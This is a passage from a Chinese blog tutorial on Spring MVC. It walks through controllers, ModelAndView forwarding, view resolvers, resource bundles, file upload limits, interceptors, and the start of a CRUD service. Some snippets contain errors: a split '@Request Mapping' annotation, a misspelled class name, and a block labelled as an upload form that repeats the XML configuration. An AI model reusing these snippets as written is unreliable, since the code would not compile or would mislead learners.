class="line"><span class="keyword">this</span>.title = title;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"Type [title="</span> + title + <span class="string">"]"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-定义MessageAction-java"><a href="#2-2-定义MessageAction-java" class="headerlink" title="2.2 定义MessageAction.java"></a><strong>2.2 定义MessageAction.java</strong></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">package</span> <span class="selector-tag">com</span><span class="selector-class">.tianxingjian</span><span class="selector-class">.action</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.stereotype</span><span class="selector-class">.Controller</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.bind</span><span class="selector-class">.annotation</span><span class="selector-class">.RequestMapping</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.bind</span><span class="selector-class">.annotation</span><span class="selector-class">.RequestMethod</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">com</span><span class="selector-class">.tianxingjian</span><span class="selector-class">.vo</span><span class="selector-class">.Message</span>;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">Controller</span> // 现在这里定义了控制器</span><br><span class="line">@Request    Mapping(<span class="string">"/pages/back/message/*"</span>) // 整体的 访问路径</span><br><span class="line">public class MessageAction &#123;</span><br><span class="line">@<span class="keyword">RequestMapping</span>(<span class="keyword">value</span>="<span class="keyword">hello_demo</span>", method=RequestMethod.GET)  // 为这个demo方法定义映射子路径以及请求类型</span><br><span class="line">public void demo(Message msg) &#123;</span><br><span class="line"><span class="selector-tag">System</span><span class="selector-class">.out</span><span class="selector-class">.println</span>(<span class="selector-tag">msg</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>    启动服务器之后访问路径：http://localhost:8080/SpringMVCDemo/pages/back/message/hello_demo.action?title=tianxingjian&amp;Type.title=LITAO即可见相应的输出</code></pre><p>定义一个pages/forward.jsp文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.alert(<span class="string">"$&#123;msg&#125;"</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">"&lt;%=basePath%&gt;$&#123;url&#125;"</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Spring-MVC解析"><a href="#2-3-Spring-MVC解析" class="headerlink" title="2.3 Spring MVC解析"></a><strong>2.3 Spring MVC解析</strong></h3><h4 id="2-3-1-org-springframework-web-servlet-ModelAndView"><a href="#2-3-1-org-springframework-web-servlet-ModelAndView" class="headerlink" title="2.3.1 org.springframework.web.servlet.ModelAndView"></a><strong>2.3.1 org.springframework.web.servlet.ModelAndView</strong></h4><pre><code>    如果现在由一个控制器跳转到forward.jsp页面，那么至少需要一下内容：</code></pre><ul><li>控制器需要知道forward.jsp的路劲</li><li><p>控制器需要传递若干个request属性</p><pre><code>  正因为很多的开发者都会面临同样的问题，所以在Spring MVC中有个类org.springframework.web.servlet.ModelAndView，这个类里含有以下几个操作方法：</code></pre></li><li><p>构造方法：public ModelAndView();</p></li><li>构造方法：public ModelAndView(String viewName), 跳转的路径地址</li><li>保存属性：public ModelAndView addObject(String attributeName, Object attributeValue)</li></ul><p><strong>修改MessageAction.java类来进行跳转功能：</strong></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(<span class="keyword">value</span>=<span class="string">"hello_demo"</span>, method=RequestMethod.GET)  <span class="comment">// 为这个demo方法定义映射子路径以及请求类型</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">demo</span>(<span class="params">Message msg</span>)</span> &#123;</span><br><span class="line">ModelAndView mav = <span class="keyword">new</span> ModelAndView(<span class="string">"/pages/forward.jsp"</span>);</span><br><span class="line">mav.addObject(<span class="string">"msg"</span>, <span class="string">"消息信息添加成功！"</span>);</span><br><span class="line">mav.addObject(<span class="string">"url"</span>, <span class="string">"/index.jsp"</span>);</span><br><span class="line">System.<span class="keyword">out</span>.println(msg);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通过以上，我们可以看到Spring MVC的优势：</strong></p><ul><li>避免了过于复杂的页面跳转路径的操作</li><li>避免了项目之中出现了过多的“.”作为参数的情况</li></ul><h4 id="2-3-2-内置对象"><a href="#2-3-2-内置对象" class="headerlink" title="2.3.2 内置对象"></a><strong>2.3.2 内置对象</strong></h4><pre><code>    在Spring MVC里面，所有的操作都是以方法的形式出现的，但是如果说在开发里面需要使用到的内置对象只有ServletContext、HttpServletRequest、HttpServletResponse、HttpSession四个内置对象。而这四个内置对象实际上只有两个HttpServletRequest、HttpServletResponse</code></pre><p><strong>在MessageAction.java里面添加inner方法</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"inner"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="keyword">inner</span>(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">ServletContext application = request.getServletContext();</span><br><span class="line">HttpSession session = request.getSession();</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"绝对路径:"</span> + application.getRealPath(<span class="string">"/"</span>));</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"session id："</span> + session.getId());</span><br><span class="line">response.getWriter().print(<span class="string">"&lt;h1&gt;www.tianxingjian.com&lt;/h1&gt;"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-3-定义安全访问"><a href="#2-3-3-定义安全访问" class="headerlink" title="2.3.3 定义安全访问"></a><strong>2.3.3 定义安全访问</strong></h4><pre><code>    在整个WEB项目里面WEB-INF目录是最安全的，但是如果按照原始的开发就会出现一个问题，每一个保存在WEB-INF目录下的JSP页面都需要编写一个映射，这样难度实在是太高了，所以在Spring里面考虑到了这类问题，提供了一个专门的类org.springframework.web.servlet.view.InternalResourceViewResolver，它需要在applicationContext.xml文件里面进行配置。    现在将保存在根目录下的pages目录直接保存在WEB-INF目录下。</code></pre><p>配置applicationContext.xml文件：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="built_in">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">property</span> <span class="built_in">name</span>=<span class="string">"prefix"</span> value=<span class="string">"/WEB-INF/pages"</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">property</span> <span class="built_in">name</span>=<span class="string">"suffix"</span> value=<span class="string">".jsp"</span>/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>这样设置之后，在以后程序使用ModelAndView设置跳转路劲的时候就不再需要这些前缀和后缀了(/WEB-INF/pages和.jsp)，例如一下例子：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"message_insertPre"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="function">ModelAndView <span class="title">insertPre</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ModelAndView mav = <span class="keyword">new</span> ModelAndView(<span class="string">"/back/message/message_insert"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写之后，完整路径是/WEB-INF/pages/back/message/message_insertPre.jsp</p><h4 id="2-3-4-资源文件"><a href="#2-3-4-资源文件" class="headerlink" title="2.3.4 资源文件"></a><strong>2.3.4 资源文件</strong></h4><pre><code>    在Spring里面同样可以实现国际化的资源文件的读取。</code></pre><ul><li>建立两个文件Message_zh_CN.properties和Pages.properties文件</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info.<span class="attribute">msg</span>=欢迎访问：&#123;0&#125;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message<span class="selector-class">.insert</span><span class="selector-class">.action</span>=/pages/back/message/message_action.action</span><br></pre></td></tr></table></figure><ul><li>如果我们要想实现资源文件的读取，则需要使用一个专门的资源文件读取类：org.springframework.context.support.ResourceBundleMssageSource</li></ul><p>在applicationContext.xml文件里面配置资源文件的读取</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"messageSource"</span> <span class="attr">class</span>=<span class="string">"org.springframework.context.support.ResourceBundleMessageSource"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basenames"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>Pages<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><pre><code>    资源文件的访问核心永远是ResourceBundle类，所以访问的时候一定不要加上后缀并且不需要指定local数据。随后可以在需要它的Action上使用依赖注入的方式进行对象的设置。</code></pre><ul><li>在MessageAction.java里面注入Source对象：</li></ul><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> MessageSource messageSource;</span><br></pre></td></tr></table></figure><ul><li>随后在MessageAction.java里更改如下</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value=<span class="meta-string">"message_insertPre"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView insertPre() &#123;</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"属性内容："</span> + <span class="keyword">this</span>.messageSource.getMessage(<span class="string">"info.msg"</span>, new Object [] &#123;<span class="string">"www.tianxingjian.com"</span>&#125;, Locale.getDefault()));</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"属性内容："</span> + <span class="keyword">this</span>.messageSource.getMessage(<span class="string">"message.insert.action"</span>, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">ModelAndView mav = new ModelAndView(<span class="string">"/pages/back/message/message_insert"</span>);</span><br><span class="line"><span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-5-文件上传"><a href="#2-3-5-文件上传" class="headerlink" title="2.3.5 文件上传"></a><strong>2.3.5 文件上传</strong></h4><pre><code>    在Spring MVC里面对于文件的上传操作依然使用了FileUpload组件（几乎所有的MVC开发框架都是用这个组件）。如果要想使用Spring MVC的文件上传，则需要使用org.springframework.web.multipart.commons.CommonsMultipartFile类来进行处理，这个类里含有如下方法：    |- 取得上传文件的MIME类型：public String getContentType();    |- 判断是否有上传文件：public boolean isEmpty();    |- 取得上传文件的长度：public long getSize();    |- 取得上传文件的输入流：public InputStream getInputStream() throws IOException;</code></pre><ul><li>在applicationContext.xml文件里定义上传操作类</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 设置上传工具限制类 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"multipartResolver"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.multipart.commons.CommonsMultipartResolver"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxUploadSize"</span> <span class="attr">value</span>=<span class="string">"5242880"</span>/&gt;</span>  <span class="comment">&lt;!-- 上传文件的最大值 5M --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxInMemorySize"</span> <span class="attr">value</span>=<span class="string">"2097152"</span>/&gt;</span>  <span class="comment">&lt;!-- 占用内存的最大值  2M --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>随后需要实现文件上传操作，在接受处理的方法上使用一个类即可：<br>  |- 接受上传文件：org.springframework.web.multipart.MultipartFile;</p></li><li><p>定义UploadAction.java实现文件的接受</p></li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"/pages/*"</span>)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadAction</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value=<span class="meta-string">"insert"</span>)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView insert(Type type, MultipartFile pic) throws IOException &#123;</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"类型名称："</span> + type.getTitle());</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"文件类型："</span> + pic.getContentType());</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"文件大小："</span> + pic.getSize());</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"是否为空："</span> + pic.isEmpty());</span><br><span class="line">System.<span class="keyword">out</span>.println(<span class="string">"数据流："</span> + pic.getInputStream());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>定义表单type_insert.jsp实现文件上传</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置上传文件工具限制类--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"multipartResolver"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.multipart.commons.CommonsMultipartResolver"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxUploadSize"</span> <span class="attr">value</span>=<span class="string">"5242880"</span>/&gt;</span>  <span class="comment">&lt;!-- 上传文件的最大值 5M --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxInMemorySize"</span> <span class="attr">value</span>=<span class="string">"2097152"</span>/&gt;</span>  <span class="comment">&lt;!-- 占用内存的最大值  2M --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候可能会出现错误，只需要导入commons-io的jar包就行了。但是这里还有一个问题，就是如果上传的文件超出了设定的大小怎么办呢？我们可以由一下方法进行解决：</p><ol><li>在applicationContext.xml文件处理错误信息</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 处理错误信息配置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"exceptionMapping"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.portlet.handler.SimpleMappingExceptionResolver"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"exceptionMappings"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"org.springframework.web.multipart.MaxUploadSizeExceededException"</span>&gt;</span></span><br><span class="line">errors</span><br><span class="line"><span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.在WEB-INF/pages下建立errors.jsp页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">对不起，程序出现错误，请按照规定重新访问！！！</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.当访问的时候，如果上传的文件大小超出设定值，则会自动跳转到errors.jsp页面</p><h4 id="2-3-5-拦截器"><a href="#2-3-5-拦截器" class="headerlink" title="2.3.5 拦截器"></a><strong>2.3.5 拦截器</strong></h4><blockquote><p>在Spring里面提供了一个专门的拦截器实现接口：org.springframework.web.servlet.HandlerInterceptor，在这里面提供如下三个方法：</p></blockquote><ul><li>操作执行前拦截：public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception;</li><li>操作执行时拦截：public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler ,ModelAndView modelAndView) throws Exception;</li><li>操作执行后拦截：public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception;</li></ul><blockquote><p>大部分情况下都会在preHandle()方法里进行拦截，因为拦截器主要处理的就是执行前的操作。</p></blockquote><h5 id="2-3-5-1-定义一个MyHandler-java类"><a href="#2-3-5-1-定义一个MyHandler-java类" class="headerlink" title="2.3.5.1 定义一个MyHandler.java类"></a><strong>2.3.5.1 定义一个MyHandler.java类</strong></h5><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">boolean</span> preHandle(HttpServletRequest request, </span><br><span class="line">HttpServletResponse response, Object <span class="keyword">handler</span>) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">System.out.println(<span class="string">"*********执行前拦截***********"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> postHandle(HttpServletRequest request, HttpServletResponse response, Object <span class="keyword">handler</span> ,</span><br><span class="line">ModelAndView modelAndView) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">System.out.println(<span class="string">"*********执行时拦截***********"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> afterCompletion(HttpServletRequest request, </span><br><span class="line">HttpServletResponse response, Object <span class="keyword">handler</span>, Exception ex) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">System.out.println(<span class="string">"*********执行处理完毕***********"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-3-5-2-定义一个HelloAction-java类"><a href="#2-3-5-2-定义一个HelloAction-java类" class="headerlink" title="2.3.5.2 定义一个HelloAction.java类"></a><strong>2.3.5.2 定义一个HelloAction.java类</strong></h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">package</span> <span class="selector-tag">com</span><span class="selector-class">.tianxingjian</span><span class="selector-class">.action</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.stereotype</span><span class="selector-class">.Controller</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.bind</span><span class="selector-class">.annotation</span><span class="selector-class">.RequestMapping</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.servlet</span><span class="selector-class">.ModelAndView</span>;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">Controller</span></span><br><span class="line">@<span class="keyword">RequestMapping</span>("/<span class="keyword">pages</span>/<span class="keyword">hello</span>/*")</span><br><span class="line"><span class="keyword">public</span> class HelloAction &#123;</span><br><span class="line">@<span class="keyword">RequestMapping</span>(<span class="keyword">value</span>="<span class="keyword">insert</span>")</span><br><span class="line">public ModelAndView insert() throws Exception &#123;</span><br><span class="line"><span class="selector-tag">System</span><span class="selector-class">.out</span><span class="selector-class">.println</span>("******<span class="selector-tag">hello</span> <span class="selector-tag">world</span>********");</span><br><span class="line"><span class="selector-tag">return</span> <span class="selector-tag">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-3-5-3-在applicationContext-xml里定义拦截器的使用"><a href="#2-3-5-3-在applicationContext-xml里定义拦截器的使用" class="headerlink" title="2.3.5.3 在applicationContext.xml里定义拦截器的使用"></a><strong>2.3.5.3 在applicationContext.xml里定义拦截器的使用</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置拦截器的使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">"/pages/**/*.action"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"com.tianxingjian.interceptor.MyHandler"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><pre><code>    此处表示对pages下的所有的*.action进行拦截。在整个拦截器的处理过程中，将处理的步骤拆分的非常的细，拦截器重点操作是在preHandler方法下，如果返回true则继续向下执行，返会false则不执行后续操作。启动tomcat后访问/pages/hello/insert.action可见拦截结果。    而preHandler最主要是在Object参数下，Object即org.springframework.web.method.HandlerMethod，在整个类里面有如下一些操作：</code></pre><ul><li>触发拦截器的程序类(Action)：public Object getBean();</li><li>取得处理的方法：public Method getMethod();</li><li>取得方法的参数数据：public MethodParameter[] getMethodParameters();<br>|- 取得方法：public Method getMethod();<br>|- 取得参数名称：public String getParameterName();<br>|- 取得参数类型：public Class&lt;?&gt; getParameterType(); </li></ul><h3 id="2-4-利用Spring-MVC实现CRUD"><a href="#2-4-利用Spring-MVC实现CRUD" class="headerlink" title="2.4 利用Spring MVC实现CRUD"></a><strong>2.4 利用Spring MVC实现CRUD</strong></h3><h4 id="2-4-1-定义IMessageService-java业务层接口"><a href="#2-4-1-定义IMessageService-java业务层接口" class="headerlink" title="2.4.1 定义IMessageService.java业务层接口"></a><strong>2.4.1 定义IMessageService.java业务层接口</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.vo.Message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMessageService</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">insert</span><span class="params">(Message vo)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">update</span><span class="params">(Message vo)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">delete</span><span class="params">(Set&lt;Integer&gt; ids)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Message <span class="title">get</span><span class="params">(<span class="keyword">int</span> id)</span> <span 